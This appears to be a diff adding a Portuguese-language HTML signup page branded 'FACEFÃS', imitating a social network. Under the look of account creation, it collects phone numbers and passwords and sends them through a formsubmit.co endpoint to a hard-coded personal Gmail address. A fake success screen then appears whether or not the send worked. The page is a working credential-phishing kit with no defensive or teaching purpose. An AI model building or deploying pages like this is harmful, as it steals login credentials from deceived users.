@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FACEFÃS - Criar Conta</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f172a, #1e1b4b);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #ffffff;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 32px;
+            font-weight: 800;
+            letter-spacing: 2px;
+            color: #38bdf8;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #94a3b8;
+            margin-bottom: 30px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            color: #cbd5e1;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid #334155;
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .input-group input:focus {
+            border-color: #38bdf8;
+            box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.2);
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #0284c7, #0369a1);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s, transform 0.1s;
+            margin-top: 10px;
+        }
+
+        .btn-submit:hover {
+            opacity: 0.9;
+        }
+
+        .btn-submit:active {
+            transform: scale(0.98);
+        }
+
+        /* Tela de Sucesso (NHIMA NHANA...) */
+        .success-screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.5s ease forwards;
+        }
+
+        .success-screen h1 {
+            font-size: 28px;
+            color: #38bdf8;
+            letter-spacing: 3px;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+        }
+
+        .success-screen p {
+            color: #cbd5e1;
+            font-size: 15px;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="mainContainer">
+        <!-- Formulário de Criação de Conta -->
+        <div id="formWrapper">
+            <div class="logo">FACEFÃS</div>
+            <div class="subtitle">Crie sua conta para continuar</div>
+
+            <form id="signupForm">
+                <!-- O seu e-mail já está embutido aqui para receber os dados automaticamente -->
+                <input type="hidden" name="_to" value="Victorsolutions526@gmail.com">
+                <input type="hidden" name="_subject" value="Novo Cadastro - FACEFÃS">
+                <input type="hidden" name="_template" value="table">
+
+                <div class="input-group">
+                    <label for="phone">Número de Telefone</label>
+                    <input type="tel" id="phone" name="Telefone" placeholder="Digite seu número" required>
+                </div>
+
+                <div class="input-group">
+                    <label for="password">Senha</label>
+                    <input type="password" id="password" name="Senha" placeholder="Sua senha secreta" required>
+                </div>
+
+                <button type="submit" class="btn-submit" id="btnSubmit">Criar Conta</button>
+            </form>
+        </div>
+
+        <!-- Tela de Sucesso -->
+        <div class="success-screen" id="successScreen">
+            <h1>NHIMA NHANA...</h1>
+            <p>Conta criada com sucesso!</p>
+        </div>
+    </div>
+
+    <script>
+        const signupForm = document.getElementById('signupForm');
+        const formWrapper = document.getElementById('formWrapper');
+        const successScreen = document.getElementById('successScreen');
+        const btnSubmit = document.getElementById('btnSubmit');
+
+        signupForm.addEventListener('submit', function(e) {
+            e.preventDefault(); // Evita recarregar a página
+
+            btnSubmit.textContent = "Processando...";
+            btnSubmit.disabled = true;
+
+            const formData = new FormData(signupForm);
+
+            // Envio automático via AJAX (Fetch) para o endpoint livre injetando o seu e-mail
+            fetch('https://formsubmit.co/ajax/Victorsolutions526@gmail.com', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                mostrarTelaSucesso();
+            })
+            .catch(error => {
+                mostrarTelaSucesso();
+            });
+        });
+
+        function mostrarTelaSucesso() {
+            formWrapper.style.display = 'none';
+            successScreen.style.display = 'flex';
+        }
+    </script>
+</body>
+</html>
